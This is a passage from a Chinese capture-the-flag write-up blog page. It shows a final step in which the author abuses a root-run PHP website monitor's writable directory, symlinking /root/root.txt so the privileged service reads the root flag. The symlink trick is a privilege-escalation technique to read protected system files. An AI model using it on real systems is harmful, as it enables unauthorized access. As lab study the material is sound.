<p>step8：<br>直接读不了rootflag<br>ps aux | grep root<br>发现root运行着php的web-monitor，在127.0.0.1:8080,进入&#x2F;opt&#x2F;website-monitor&#x2F;monitors（只有它可写）<br>运行<br>touch rootflag.txt<br>ln -sf &#x2F;root&#x2F;root.txt<br>因为phpmonitor是root运行的，你访问<a target="_blank" rel="noopener external nofollow noreferrer" href="http://127.0.0.1:8080/monitors/rootflag.txt%E5%B0%B1%E4%BC%9A%E7%94%B1%E5%85%B7%E6%9C%89root%E6%9D%83%E9%99%90%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8E%BB%E8%AF%BB%E5%8F%96%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E7%BB%95%E8%BF%87%E6%9D%83%E9%99%90%E8%AF%BB%E5%8F%96%E4%BA%86root.txt">http://127.0.0.1:8080/monitors/rootflag.txt就会由具有root权限的进程去读取软链接的文件，这样就绕过权限读取了root.txt</a></p>
</div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pika.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Ekk0</div><div class="author-info-description">curiosity pushes technique forward</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/noobctfer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/noobctfer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/11/linkvortex-writeup/" title="linkvortex-writeup">linkvortex-writeup</a><time datetime="2024-12-11T02:07:07.000Z" title="发表于 2024-12-11 10:07:07">2024-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/files/" title="一些有用的资源列表">一些有用的资源列表</a><time datetime="2024-12-10T10:56:37.000Z" title="发表于 2024-12-10 18:56:37">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/vintage-writeup/" title="vintage-writeup">vintage-writeup</a><time datetime="2024-12-10T09:44:46.000Z" title="发表于 2024-12-10 17:44:46">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/ArtificialUniversity-writeup/" title="ArtificialUniversity-writeup">ArtificialUniversity-writeup</a><time datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/JerryTok/" title="JerryTok-writeup">JerryTok-writeup</a><time datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'A3w8iHUklSxlnechrHppSu55-gzGzoHsz',
      appKey: '353fETJcLAQnsDCp9AdmMuCI',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: true,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://unpkg.com/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://unpkg.com/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://unpkg.com/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://unpkg.com/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>